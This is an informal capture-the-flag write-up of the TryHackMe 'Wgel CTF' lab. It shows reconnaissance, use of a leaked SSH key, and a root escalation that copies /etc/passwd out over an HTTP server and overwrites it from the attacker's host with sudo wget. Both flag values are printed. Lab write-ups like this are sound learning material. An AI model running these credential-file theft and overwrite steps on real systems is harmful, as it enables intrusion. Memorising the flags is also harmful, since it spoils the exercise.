# TRYHACKME - Wgel CTF

I am going to make this fast cuz it's a easy room!

**nmap**: port 22, 80

## 80 apache: 

Comment from `/` directory --> *credential found*: `jessie`

*Brute-forcing* --> `/sitemap/id_rsa` --> get that sh*

## 22 SSH:
```bash
chmod 700 id_rsa
scp -i id_rsa /opt/linpeas.sh jessie@$IP:/tmp # transfer file via ssh
ssh -i id_rsa jessie@$IP
# .......
```
**From /home/jessie/user.txt**:

**user flag**: `057c67131c3d5e42dd5cd3075b198ff6`

## Privilege Escalation
Run `linpeas` --> `(root) NOPASSWD: /usr/bin/wget`

Ok, we can using `wget` with root permission to overwrite linux credential file like `/etc/passwd` with *option* `-O` for output document file

**passwd file format**: *reference* -> `https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/`
![passwd file format](passwd-file-format.png)

  **1. Username**: It is used when user logs in. It should be between 1 and 32 characters in length.

  **2. Password**: An `x character indicates that encrypted password is stored in /etc/shadow file`. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file.

  **3. User ID (UID)**: Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.

  **4. Group ID (GID)**: The primary group ID (stored in /etc/group file)
  
  **5. User ID Info (GECOS)**: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
  
  **6. Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
  
  **7. Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. For example, sysadmin can use the nologin shell, which acts as a replacement shell for the user accounts. If shell set to /sbin/nologin and the user tries to log in to the Linux system directly, the /sbin/nologin shell closes the connection.

Yes, that `x` is where we gonna modify root password, stop stammering and just do that!!

**From remote machine**:
```bash
cp /etc/passwd /tmp # copy for safety
cd /etc; python3 -m http.server 8989
```

**From attacking machine**:
```bash
wget http://$IP:8989/passwd -O passwd
# we got: root:x:0:0:root:/root:/bin/bash

# encrypt the replacing password first!, we using python for that
```
```python
import encrypt
encrypt.encrypt('admin')
# return: $6$rM9TXpSZoOnQgVfQ$tkz5ER7TUE3u8KkRdoiKYFcxNOieTH3dEEe1E3fU/zzfzAbwl.ixt5y0lnLEGIyyJHq3497yavXu6olwIIH.F/
```

**Modify passwd file**: 
```
root:x:0:0:root:/root:/bin/bash
# to
root:$6$rM9TXpSZoOnQgVfQ$tkz5ER7TUE3u8KkRdoiKYFcxNOieTH3dEEe1E3fU/zzfzAbwl.ixt5y0lnLEGIyyJHq3497yavXu6olwIIH.F/:0:0:root:/root:/bin/bash
# save that!
```

**Host it**:
```bash
python3 -m http.server 80
```

**Back to remote machine**:
```bash
sudo wget http://$TUN-IP/passwd -O /etc/passwd
# done!!

su root
# Password: admin
whoami # root
```

**From /root/root.txt**:

**root flag**: `b1b968b37519ad1daa6408188649263d`
